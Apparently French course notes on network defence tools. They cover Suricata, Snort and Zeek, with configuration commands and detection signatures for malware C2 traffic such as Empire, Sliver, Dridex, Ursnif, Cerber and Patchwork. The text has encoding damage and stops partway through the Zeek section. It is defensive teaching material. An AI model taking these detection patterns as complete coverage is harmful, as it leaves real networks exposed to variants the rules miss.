**Suricata**, gÃ©rÃ© par l'Open Information Security Foundation (OISF), est une solution de sÃ©curitÃ© rÃ©seau open-source idÃ©ale pour les SystÃ¨mes de DÃ©tection d'Intrusions (IDS), les SystÃ¨mes de PrÃ©vention d'Intrusions (IPS) et la Surveillance de la SÃ©curitÃ© du RÃ©seau (NSM). Elle excelle dans l'inspection approfondie des paquets et offre une journalisation complÃ¨te, aidant les administrateurs Ã  dÃ©tecter et rÃ©pondre aux activitÃ©s suspectes dans le trafic rÃ©seau.

### Modes de fonctionnement de Suricata

* **SystÃ¨me de DÃ©tection d'Intrusions (IDS)** : Surveille passivement le trafic, signale les menaces potentielles et amÃ©liore la visibilitÃ© du rÃ©seau, mais n'intervient pas.

* **SystÃ¨me de PrÃ©vention d'Intrusions (IPS)** : Agit de maniÃ¨re proactive en bloquant le trafic suspect avant qu'il n'entre dans le rÃ©seau, ce qui amÃ©liore la sÃ©curitÃ©, mais au prix d'une latence accrue.

* **SystÃ¨me de DÃ©tection et de PrÃ©vention d'Intrusions (IDPS)** : Combine les fonctionnalitÃ©s IDS et IPS, surveillant passivement tout en Ã©tant capable d'envoyer des paquets de rÃ©initialisation (RST) pour terminer des sessions suspectes.

* **Surveillance de la SÃ©curitÃ© du RÃ©seau (NSM)** : Se contente de journaliser toutes les donnÃ©es rÃ©seau, capturant chaque transaction pour une analyse forensique et rÃ©trospective.

---

### EntrÃ©es de Suricata

* **EntrÃ©e hors ligne** : Traite les fichiers PCAP stockÃ©s, adaptÃ©s pour l'analyse rÃ©trospective et le test de rÃ¨gles.

* **EntrÃ©e en direct** :

  * **LibPCAP** : Lit les paquets depuis les interfaces rÃ©seau, avec des performances limitÃ©es.
  * **NFQ** : Mode IPS en ligne sous Linux, utilisant IPTables pour passer les paquets Ã  Suricata pour inspection.
  * **AF\_PACKET** : Version amÃ©liorÃ©e de LibPCAP, prenant en charge le multi-threading et adaptÃ©e Ã  l'analyse en temps rÃ©el sur les systÃ¨mes Linux compatibles.

---

### Sorties de Suricata

Suricata gÃ©nÃ¨re divers types de journaux, y compris des alertes, des requÃªtes DNS, des requÃªtes HTTP et des donnÃ©es de flux rÃ©seau. Les principales sorties sont :

* **EVE JSON** : Journalise les Ã©vÃ©nements au format JSON pour Ãªtre compatible avec des outils comme Logstash, couvrant des types d'Ã©vÃ©nements tels que les alertes, DNS, HTTP et TLS.
* **Unified2** : Format binaire d'alerte compatible avec Snort, permettant l'intÃ©gration avec des outils Snort comme u2spewfoo.

---

#### Exemple de consultation du journal EVE JSON

```bash
Kailez@htb[/htb]$ less /var/log/suricata/old_eve.json
```

---

### Configuration de Suricata et rÃ¨gles personnalisÃ©es

* **Lister les fichiers de rÃ¨gles** : Voir les fichiers de rÃ¨gles disponibles.

  ```bash
  Kailez@htb[/htb]$ ls -lah /etc/suricata/rules/
  ```

* **Modifier les variables de Suricata** : DÃ©finir `$HOME_NET` et `$EXTERNAL_NET` dans `suricata.yaml` pour reprÃ©senter les segments rÃ©seau de confiance et non de confiance, respectivement.

* **Ajouter des rÃ¨gles personnalisÃ©es** :
  Exemple de rÃ¨gle pour alerter sur les transactions HTTP :

  ```plaintext
  alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  ```

---

### Manipulation des entrÃ©es Suricata

* **Analyse hors ligne** :

  ```bash
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/suspicious.pcap
  ```

* **EntrÃ©e en direct utilisant AF\_PACKET** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata --af-packet=ens160
  ```

* **Utilisation de tcpreplay pour simuler le trafic** :

  ```bash
  Kailez@htb[/htb]$ sudo tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
  ```

---

### Journaux de Suricata

* **EVE JSON** : Un journal complet au format JSON contenant des Ã©vÃ©nements tels que les alertes, HTTP, DNS et des mÃ©tadonnÃ©es TLS.

  Pour ne voir que les Ã©vÃ©nements d'alerte :

  ```bash
  cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == "alert")'
  ```

* **fast.log** : Journal texte enregistrant uniquement les alertes, utile pour un examen rapide.

  ```bash
  Kailez@htb[/htb]$ cat /var/log/suricata/old_fast.log
  ```

* **stats.log** : Affiche les statistiques et l'utilisation des ressources, utile pour surveiller les performances.

  ```bash
  Kailez@htb[/htb]$ cat /var/log/suricata/old_stats.log
  ```

---

### Extraction de fichiers

Suricata peut extraire des fichiers transfÃ©rÃ©s via certains protocoles pour une analyse forensique.

* **Activer l'extraction de fichiers dans suricata.yaml** :

  ```yaml
  file-store:
    version: 2
    enabled: yes
    force-filestore: yes
  ```

* **Ajouter une rÃ¨gle d'extraction personnalisÃ©e** :
  Exemple :

  ```plaintext
  alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  ```

* **ExÃ©cuter Suricata sur un fichier PCAP** :

  ```bash
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/vm-2.pcap
  ```

* **Inspecter les fichiers extraits** :

  ```bash
  Kailez@htb[/htb]$ cd filestore
  Kailez@htb[/htb]$ find . -type f
  ```

---

### Mise Ã  jour et rechargement des rÃ¨gles

* **Activer le rechargement en direct des rÃ¨gles** :

  ```yaml
  detect-engine:
    - reload: true
  ```

* **Recharger les rÃ¨gles** :

  ```bash
  Kailez@htb[/htb]$ sudo kill -usr2 $(pidof suricata)
  ```

* **Mettre Ã  jour les ensembles de rÃ¨gles avec `suricata-update`** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update
  ```

* **Lister les sources disponibles des ensembles de rÃ¨gles** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update list-sources
  ```

* **Activer des ensembles de rÃ¨gles spÃ©cifiques** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update enable-source et/open
  ```

---

### Validation de la configuration Suricata

Pour valider la configuration de Suricata et vous assurer qu'elle est correctement paramÃ©trÃ©e :

```bash
Kailez@htb[/htb]$ sudo suricata -T -c /etc/suricata/suricata.yaml
```

---

### CaractÃ©ristiques principales de Suricata

* **Inspection approfondie des paquets** : Inspection complÃ¨te du contenu et des en-tÃªtes des paquets.
* **DÃ©tection de protocoles** : Prise en charge de multiples protocoles pour une surveillance complÃ¨te du rÃ©seau.
* **DÃ©tection et prÃ©vention des intrusions** : Modes polyvalents pour une dÃ©fense passive et active.
* **Extraction de fichiers** : Capture des fichiers transfÃ©rÃ©s via certains protocoles pour une analyse forensique.
* **Rechargement des rÃ¨gles en direct** : Mise Ã  jour des rÃ¨gles sans interruption du service.
* **Journalisation complÃ¨te** : JSON, fast.log, et plus encore, pour des insights personnalisÃ©s dans le trafic rÃ©seau.

---

```

## **Suricata Rule Development Part 1**

```jsx
Les **rÃ¨gles Suricata** sont utilisÃ©es pour surveiller le trafic rÃ©seau Ã  la recherche de motifs ou d'indicateurs spÃ©cifiques, souvent rÃ©vÃ©lateurs de comportements malveillants. Ces rÃ¨gles peuvent fournir des informations cruciales sur l'activitÃ© rÃ©seau, aider Ã  la dÃ©tection des menaces et contribuer Ã  des stratÃ©gies de sÃ©curitÃ© rÃ©seau proactives.

### Anatomie d'une rÃ¨gle Suricata

Voici un exemple de rÃ¨gle de base de Suricata :

```plaintext
action protocol from_ip port -> to_ip port (msg:"Comportement malveillant connu, possible infection par le malware X"; content:"certaines chaÃ®nes"; content:"autres chaÃ®nes"; sid:10000001; rev:1;)
```

#### Composants de la rÃ¨gle :

1. **En-tÃªte (action protocol from\_ip port -> to\_ip port)** :

   * **Action** : Indique Ã  Suricata ce qu'il doit faire lorsque la rÃ¨gle correspond :

     * `alert` : GÃ©nÃ¨re une alerte.
     * `log` : Journalise le paquet sans alerter.
     * `drop` : Bloque le paquet (en mode IPS).
   * **Protocole** : SpÃ©cifie le protocole rÃ©seau (tcp, udp, icmp, etc.).
   * **Direction du trafic** :

     * `->` pour le trafic sortant, `<-` pour le trafic entrant, et `<->` pour bidirectionnel.
   * **Ports** : DÃ©finit les ports source et destination pour lâ€™Ã©valuation.

2. **Message et Contenu de la RÃ¨gle** :

   * **msg** : Description affichÃ©e lorsque la rÃ¨gle est dÃ©clenchÃ©e, souvent incluant des informations sur le malware.
   * **content** : ChaÃ®nes spÃ©cifiques ou valeurs que Suricata recherche dans le contenu du paquet.
     Exemple :

     ```plaintext
     content:"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip";
     ```

     Le contenu peut Ãªtre optimisÃ© avec des tampons de rÃ¨gles, comme `http.accept` pour faire correspondre uniquement les en-tÃªtes HTTP `Accept`.

3. **Options supplÃ©mentaires** :

   * **nocase** : Rend la rÃ¨gle insensible Ã  la casse.
   * **offset** : DÃ©finit la position de dÃ©part dans le paquet pour la correspondance.
   * **distance** : SpÃ©cifie la distance en octets par rapport Ã  la correspondance prÃ©cÃ©dente.
   * **dsize** : Correspond Ã  la taille du charge utile du paquet (par exemple, `dsize:>10000` pour les paquets de grande taille).

4. **MÃ©tadonnÃ©es** :

   * **sid** : Identifiant de signature unique pour chaque rÃ¨gle.
   * **rev** : NumÃ©ro de rÃ©vision indiquant les mises Ã  jour de la rÃ¨gle.
   * **reference** : Une URL ou un identifiant fournissant du contexte ou des sources pour la rÃ¨gle.

---

### Exemple dâ€™utilisation de rÃ¨gles avec PCRE

Les **expressions rÃ©guliÃ¨res compatibles avec Perl (PCRE)** augmentent la flexibilitÃ© de la dÃ©tection. Voici un exemple :

```plaintext
alert http any any -> $HOME_NET any (msg: "ATTACK [PTsecurity] Apache Continuum <= v1.4.2 CMD Injection"; content: "POST"; http_method; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; http_uri; content: "installation.varValue="; nocase; http_client_body; pcre: !"/^\$?[\sa-z\\_0-9.-]*(\&|$)/iRP"; flow: to_server, established; sid: 10000048; rev: 1;)
```

* **PCRE** : Permet la correspondance de motifs complexes en utilisant des expressions rÃ©guliÃ¨res. Elles sont entourÃ©es de `/.../` et peuvent utiliser des drapeaux comme `i` pour l'insensibilitÃ© Ã  la casse et `RP` pour le positionnement relatif.

---

### Approches de dÃ©veloppement des rÃ¨gles IDS/IPS

1. **DÃ©tection basÃ©e sur les signatures** : Correspond aux motifs connus (par exemple, chaÃ®nes de malware ou structures de paquets). Câ€™est prÃ©cis pour les menaces connues, mais limitÃ© pour dÃ©tecter les nouvelles.

2. **DÃ©tection basÃ©e sur les anomalies** : Se concentre sur les comportements rÃ©seau inhabituels (par exemple, motifs de transfert de donnÃ©es). Cela aide Ã  dÃ©tecter les attaques de type *zero-day*, mais peut gÃ©nÃ©rer des faux positifs.

3. **Analyse des protocoles dâ€™Ã©tat** : Suit les Ã©tats des protocoles pour identifier les transitions ou comportements inhabituels, adaptÃ© Ã  la dÃ©tection de mauvaise utilisation des protocoles.

---

### Exemples de dÃ©veloppement de rÃ¨gles Suricata

**Exemple 1 : DÃ©tection de PowerShell Empire**

```plaintext
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Possible activitÃ© PowerShell Empire sortante"; flow:established,to_server; content:"GET"; http_method; content:"/"; http_uri; depth:1; pcre:"/^(?:login\/process|admin\/get|news)\.php$/RU"; content:"session="; http_cookie; pcre:"/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi"; content:"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"; http_user_agent; http_start; content:".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="; fast_pattern; http_header_names; content:!"Referer"; content:!"Cache"; content:!"Accept"; sid:2027512; rev:1;)
```

* DÃ©tecte les requÃªtes HTTP GET de PowerShell Empire avec des motifs URI spÃ©cifiques et des cookies encodÃ©s en base64.

---

**Exemple 2 : DÃ©tection de Covenant**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"dÃ©tectÃ© par body"; content:"<title>Hello World!</title>"; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)
```

* DÃ©clenche lorsqu'un paquet HTTP contenant `<title>Hello World!</title>` apparaÃ®t au moins quatre fois dans les 10 secondes provenant de la mÃªme source.

---

**Exemple 3 : DÃ©tection par taille et compteur de Covenant**

```plaintext
alert tcp $HOME_NET any -> any any (msg:"dÃ©tectÃ© par taille et compteur"; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)
```

* DÃ©tecte les paquets dont la charge utile fait exactement 312 octets, envoyÃ©s au moins trois fois dans une fenÃªtre de 10 secondes.

---

**Exemple 4 : DÃ©tection de l'implant C2 Sliver**

```plaintext
alert tcp any any -> any any (msg:"Implant C2 Sliver dÃ©tectÃ©"; content:"POST"; pcre:"/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z_]{1,2}=[a-z0-9]{1,10}/i"; sid:1000007; rev:1;)
```

* DÃ©tecte les requÃªtes HTTP POST vers des URI associÃ©es Ã  Sliver, un framework C2, en utilisant des motifs de rÃ©pertoires et de fichiers PHP spÃ©cifiques.

---

**RÃ¨gle supplÃ©mentaire pour la dÃ©tection de Sliver via les cookies**

```plaintext
alert tcp any any -> any any (msg:"Implant C2 Sliver dÃ©tectÃ© - Cookie"; content:"Set-Cookie"; pcre:"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/"; sid:1000003; rev:1;)
```

* DÃ©tecte les cookies avec des noms comme **PHPSESSID** ou **APISID** et des valeurs correspondant Ã  un motif alphanumÃ©rique de 32 caractÃ¨res, souvent associÃ© Ã  Sliver.

---

```

## **Suricata Rule Development Part 2 (Encrypted Traffic)**

```jsx

### Techniques clÃ©s pour la dÃ©tection des menaces sur le trafic chiffrÃ©

1. **Certificats SSL/TLS** : Lors de la poignÃ©e de main SSL/TLS, des informations telles que l'Ã©metteur, le sujet et le domaine sont Ã©changÃ©es et restent non chiffrÃ©es. Les attaquants peuvent utiliser des certificats avec des caractÃ©ristiques inhabituelles, ce qui permet de les dÃ©tecter en se basant sur ces anomalies.

2. **Hachage JA3** : Les hachages JA3 fournissent une empreinte unique dâ€™un client SSL/TLS en hachant certains attributs du message **Client Hello** lors de la poignÃ©e de main. Ces hachages aident Ã  identifier des caractÃ©ristiques uniques associÃ©es Ã  certaines familles de malwares.

---

### Exemples de rÃ¨gles Suricata pour la dÃ©tection de trafic chiffrÃ©

#### Exemple 5 : DÃ©tection de Dridex (TLS chiffrÃ©)

```plaintext
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"; flow:established,from_server; content:"|16|"; content:"|0b|"; within:8; byte_test:3,<,1200,0,relative; content:"|03 02 01 02 02 09 00|"; fast_pattern; content:"|30 09 06 03 55 04 06 13 02|"; distance:0; pcre:"/^[A-Z]{2}/R"; content:"|55 04 07|"; distance:0; content:"|55 04 0a|"; distance:0; pcre:"/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs"; content:"|55 04 03|"; distance:0; byte_test:1,>,13,1,relative; content:!"www."; distance:2; within:4; pcre:"/^.{2}(?P<CN>(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs"; content:!"|2a 86 48 86 f7 0d 01 09 01|"; content:!"GoDaddy"; sid:2023476; rev:5;)
```

* **But** : DÃ©tecte les certificats SSL associÃ©s au trojan Dridex en se basant sur des motifs spÃ©cifiques dans la poignÃ©e de main SSL/TLS.
* **Options clÃ©s** :

  * **Valeurs hexadÃ©cimales** : `content:"|16|"; content:"|0b|"; within:8;` pour la poignÃ©e de main et le type de certificat.
  * **Identifiants de champ** : VÃ©rifie les champs `countryName` et `commonName`.
  * **OID** : SÃ©quences ASN.1 reprÃ©sentant des champs comme `countryName`, `localityName`, `organizationName`, etc.
  * **PCRE** : VÃ©rifie les motifs dans le `commonName` avec une correspondance de structure supplÃ©mentaire.

*Test de la rÃ¨gle* : DÃ©commentez cette rÃ¨gle dans `local.rules` et exÃ©cutez Suricata sur le fichier `dridex.pcap`.

---

#### Exemple 6 : DÃ©tection de Sliver (TLS chiffrÃ©)

```plaintext
alert tls any any -> any any (msg:"Sliver C2 SSL"; ja3.hash; content:"473cd7cb9faa642487833865d516e578"; sid:1002; rev:1;)
```

* **But** : DÃ©tecte le trafic C2 de Sliver en faisant correspondre un hachage JA3 connu.
* **Options clÃ©s** :

  * **ja3.hash** : Recherche le hachage JA3 spÃ©cifique associÃ© Ã  Sliver.

*Test de la rÃ¨gle* : Obtenez le hachage JA3 en utilisant l'outil **ja3** sur le fichier `sliverenc.pcap`. DÃ©commentez cette rÃ¨gle dans `local.rules` et exÃ©cutez Suricata sur `sliverenc.pcap` pour valider la dÃ©tection.

---

```

## Snort Fundamentals

```jsx

---

### **Snort : PrÃ©sentation GÃ©nÃ©rale**

**Snort** est un outil open-source qui agit comme un **systÃ¨me de dÃ©tection d'intrusion (IDS)** et un **systÃ¨me de prÃ©vention d'intrusion (IPS)**. Il peut Ã©galement Ãªtre utilisÃ© comme **analyseur de paquets** ou **renifleur de trafic**.
Snort inspecte lâ€™ensemble du trafic rÃ©seau et peut enregistrer toutes les activitÃ©s, offrant une visibilitÃ© complÃ¨te au niveau de la couche application. Son comportement est dirigÃ© par des **rÃ¨gles spÃ©cifiques** qui dÃ©finissent ce quâ€™il doit surveiller ou identifier.

---

### **Modes de Fonctionnement de Snort**

* **IDS/IPS en mode inline** : Permet de bloquer activement le trafic lorsquâ€™il fonctionne comme IPS.
* **IDS passif** : Observe et journalise le trafic sans lâ€™interrompre.
* **IDS basÃ© sur le rÃ©seau** : Surveille le trafic rÃ©seau provenant de plusieurs hÃ´tes.
* **IDS basÃ© sur lâ€™hÃ´te** : Rarement utilisÃ© avec Snort (des outils spÃ©cialisÃ©s sont plus adaptÃ©s).

---

### **Modules DAQ (Data Acquisition)**

Les modules DAQ permettent Ã  Snort d'interagir avec les sources de donnÃ©es rÃ©seau.

* **Mode passif** : Observe le trafic sans le bloquer.
* **Mode inline** : Peut bloquer le trafic selon les rÃ¨gles dÃ©finies (ex. : utilisation de lâ€™option `-Q` avec le module DAQ `afpacket`).

---

### **Architecture de Snort**

* **Sniffer de paquets** : DÃ©crypte le trafic rÃ©seau et transmet les paquets aux prÃ©processeurs.
* **PrÃ©processeurs** : Analysent les types de paquets et leur comportement. ConfigurÃ©s dans le fichier `snort.lua`, ils dÃ©tectent par exemple le trafic HTTP ou les scans.
* **Moteur de dÃ©tection** : Compare les paquets aux rÃ¨gles Snort.
* **Journalisation et alertes** : Les paquets correspondants aux rÃ¨gles sont enregistrÃ©s, souvent dans `syslog` ou des bases de donnÃ©es, Ã  lâ€™aide de plugins de sortie dÃ©finis dans `snort.lua`.

---

### **Configuration de Snort**

#### **Fichiers de configuration** :

* **`snort.lua`** : Fichier principal, contenant les variables rÃ©seau, les dÃ©codeurs, le moteur de dÃ©tection, et les sorties.
* **`snort_defaults.lua`** : Fournit des configurations par dÃ©faut.

Pour visualiser ou modifier la configuration :

```bash
sudo more /root/snorty/etc/snort/snort.lua
```

#### **Valider la configuration** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
```

---

### **Sources dâ€™entrÃ©e de Snort**

#### **Analyse dâ€™un fichier PCAP** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap
```

#### **Surveillance en temps rÃ©el dâ€™une interface rÃ©seau** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i nom_interface
```

---

### **RÃ¨gles Snort**

Les rÃ¨gles Snort sont composÃ©es dâ€™un **en-tÃªte** (dÃ©finissant les critÃ¨res) et dâ€™**options** (actions et contenus spÃ©cifiques). Elles sont intÃ©grÃ©es dans `snort.lua`, gÃ©nÃ©ralement dans la section `ips` :

```lua
ips = {
    { variables = default_variables, include = '/chemin/vers/fichier.rules' }
}
```

#### **Chargement des rÃ¨gles en ligne de commande** :

* Fichier unique : `-R /chemin/vers/fichier.rules`
* RÃ©pertoire contenant plusieurs rÃ¨gles : `--rule-path /chemin/vers/dossier`

---

### **Sorties de Snort**

Snort peut gÃ©nÃ©rer plusieurs types de rapports :

* **Statistiques de base** : RÃ©sume le nombre de paquets, les types dâ€™activitÃ©, les fichiers traitÃ©s, et les performances du systÃ¨me.

* **Alertes** :

  * `-A cmg` : Affiche des alertes rapides avec en-tÃªtes de paquets et payloads.
  * `-A u2` : Format binaire Unified2, pour traitement post-analyse.
  * `-A csv` : Format CSV.

* **Statistiques de performance** : Surveillent la mÃ©moire, le CPU et les performances gÃ©nÃ©rales.

Pour lister les plugins de sortie disponibles :

```bash
snort --list-plugins | grep logger
```

#### **Exemple avec sortie en format cmg** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap -A cmg
```

---

### **FonctionnalitÃ©s clÃ©s de Snort**

* Inspection approfondie des paquets (Deep Packet Inspection).
* DÃ©tection dâ€™intrusion en temps rÃ©el.
* Surveillance de la sÃ©curitÃ© rÃ©seau.
* Prise en charge du trafic IPv4 et IPv6.
* DÃ©tection dâ€™anomalies et support multi-locataire.

---

```

## **Snort Rule Development**

```jsx

---

### **RÃ¨gles Snort : DÃ©tection d'activitÃ©s malveillantes**

Une **rÃ¨gle Snort** est un outil puissant permettant d'identifier et de signaler des activitÃ©s malveillantes potentielles dans le trafic rÃ©seau. Bien que les rÃ¨gles Snort ressemblent aux rÃ¨gles Suricata avec une structure composÃ©e d'un en-tÃªte de rÃ¨gle et d'options, la documentation de Snort offre des conseils dÃ©taillÃ©s pour crÃ©er des rÃ¨gles efficaces.

Voici des exemples de rÃ¨gles pour dÃ©tecter des malwares spÃ©cifiques. Vous pouvez utiliser ces rÃ¨gles en SSH sur le systÃ¨me cible pour reproduire et comprendre les commandes.

---

#### **Exemple 1 : DÃ©tection d'Ursnif (de maniÃ¨re inefficace)**

```plaintext
alert tcp any any -> any any (msg:"Possible Ursnif C2 Activity"; flow:established,to_server; content:"/images/", depth 12; content:"_2F"; content:"_2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002; rev:1;)
```

Cette rÃ¨gle dÃ©tecte le malware **Ursnif** en cherchant des motifs spÃ©cifiques dans le trafic HTTP :

* `flow:established,to_server;` : correspond aux connexions TCP Ã©tablies vers le serveur.
* `content:"/images/", depth 12;` : cherche la chaÃ®ne `/images/` dans les 12 premiers octets.
* D'autres champs `content` correspondent Ã  des motifs supplÃ©mentaires, comme "\_2F", "\_2B" et des en-tÃªtes HTTP spÃ©cifiques.
* `!` dans `content:!"Accept";` indique l'absence de certains en-tÃªtes HTTP.

**Tester la rÃ¨gle sur le fichier ursnif.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
```

---

#### **Exemple 2 : DÃ©tection de Cerber**

```plaintext
alert udp $HOME_NET any -> $EXTERNAL_NET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fast_pattern; pcre:"/^[af0-9]{7}$/R"; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)
```

Cette rÃ¨gle cible le malware **Cerber** :

* `dsize:9;` : restreint la rÃ¨gle aux datagrammes ayant une charge utile de 9 octets.
* `content:"hi", depth 2, fast_pattern;` : recherche "hi" dans les deux premiers octets.
* `pcre:"/^[af0-9]{7}$/R";` : utilise une expression rÃ©guliÃ¨re pour rechercher sept caractÃ¨res hexadÃ©cimaux aprÃ¨s "hi".
* `detection_filter` limite la frÃ©quence des alertes par source.

**Tester la rÃ¨gle sur le fichier cerber.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
```

---

#### **Exemple 3 : DÃ©tection de Patchwork**

```plaintext
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow:established,to_server; http_method; content:"POST"; http_uri; content:".php?profile="; http_client_body; content:"ddager=", depth 7; http_client_body; content:"&r1=", distance 0; http_header; content:!"Accept"; http_header; content:!"Referer|3a|"; sid:10000006; rev:1;)
```

Cette rÃ¨gle dÃ©tecte le malware **Patchwork APT** en cherchant des motifs HTTP spÃ©cifiques :

* `flow:established,to_server;` : spÃ©cifie les connexions sortantes.
* `http_method; content:"POST";` : recherche des requÃªtes HTTP POST.
* `http_client_body` et `http_header` filtrent pour des contenus spÃ©cifiques et l'absence d'en-tÃªtes.

**Tester avec le fichier patchwork.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

---

#### **Exemple 4 : DÃ©tection de Patchwork (SSL)**

```plaintext
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Patchwork SSL Cert Detected"; flow:established,from_server; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
```

Cette rÃ¨gle SSL dÃ©tecte le malware **Patchwork** en cherchant des motifs dans les certificats SSL :

* `content:"|55 04 03|";` : cible les champs de nom commun dans les certificats X.509 au format ASN.1.
* `distance` et `within` affinent la recherche.

**ExÃ©cuter avec le fichier patchwork.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

---

### **RÃ©sumÃ© des Commandes et Tests**

* **Tester une rÃ¨gle avec un fichier PCAP** :

  * ExÃ©cution pour chaque fichier pcap spÃ©cifiÃ© (`ursnif.pcap`, `cerber.pcap`, etc.).
  * Option `-A cmg` permet de formater les alertes pour les afficher rapidement.

Chaque exemple de rÃ¨gle Snort se concentre sur des motifs spÃ©cifiques dans le trafic rÃ©seau pour identifier des comportements associÃ©s Ã  des malwares comme **Ursnif**, **Cerber**, ou **Patchwork**. Ces rÃ¨gles peuvent Ãªtre adaptÃ©es et optimisÃ©es selon les besoins de votre infrastructure de sÃ©curitÃ©.

---

```

## **Zeek Fundamentals**

```jsx
Zeek est un analyseur de trafic rÃ©seau open-source largement utilisÃ© pour identifier des activitÃ©s rÃ©seau suspectes ou malveillantes. Il est Ã©galement trÃ¨s efficace pour le dÃ©pannage rÃ©seau et la mesure des performances. Zeek gÃ©nÃ¨re des fichiers journaux qui fournissent des informations dÃ©taillÃ©es sur toutes les activitÃ©s rÃ©seau, ce qui en fait un outil prÃ©cieux pour les Ã©quipes de cybersÃ©curitÃ© (blue teams). Ces journaux contiennent des enregistrements dÃ©taillÃ©s des connexions et des activitÃ©s au niveau de la couche application, telles que les requÃªtes DNS, les sessions HTTP, etc. En outre, les fonctions de Zeek permettent une analyse approfondie et une dÃ©tection qui vont au-delÃ  de la simple journalisation.

L'une des caractÃ©ristiques les plus marquantes de Zeek est son langage de script puissant, qui permet aux utilisateurs de crÃ©er des scripts personnalisÃ©s similaires aux rÃ¨gles de Suricata. Ce langage permet aux Ã©quipes de sÃ©curitÃ© de dÃ©velopper des stratÃ©gies d'analyse rÃ©seau et de dÃ©tection d'intrusions sur mesure.

### CaractÃ©ristiques de dÃ©tection de Zeek

PlutÃ´t que de se contenter d'une dÃ©tection basÃ©e sur des signatures, Zeek propose une dÃ©tection par **abus sÃ©mantique**, **dÃ©tection d'anomalies** et **analyse comportementale**.

---

### Modes de fonctionnement de Zeek

Zeek fonctionne dans plusieurs modes :

* **Analyse de trafic entiÃ¨rement passive** : Ne gÃ©nÃ¨re pas de trafic rÃ©seau mais observe et analyse le trafic existant.
* **Interface libpcap pour la capture de paquets** : Utilise libpcap pour la capture de paquets rÃ©seau.
* **Analyse en temps rÃ©el et hors ligne** : Peut Ãªtre exÃ©cutÃ© en mode en temps rÃ©el ou avec des fichiers PCAP pour une analyse hors ligne.
* **Support des clusters pour des dÃ©ploiements Ã  grande Ã©chelle** : Zeek peut Ãªtre dÃ©ployÃ© en mode cluster pour analyser de maniÃ¨re distribuÃ©e de grandes quantitÃ©s de trafic rÃ©seau.

---

### Architecture de Zeek

L'architecture de Zeek est composÃ©e de deux composants principaux :

1. **Moteur d'Ã©vÃ©nements (noyau)** :

   * Transforme le flux de paquets entrants en une sÃ©rie d'Ã©vÃ©nements de haut niveau qui dÃ©crivent l'activitÃ© rÃ©seau.
   * Ces Ã©vÃ©nements sont **neutres en termes de politique**, ils dÃ©crivent ce qui s'est passÃ© sans l'interprÃ©ter (par exemple, une requÃªte HTTP est enregistrÃ©e comme un Ã©vÃ©nement `http_request`).

2. **InterprÃ©teur de script** :

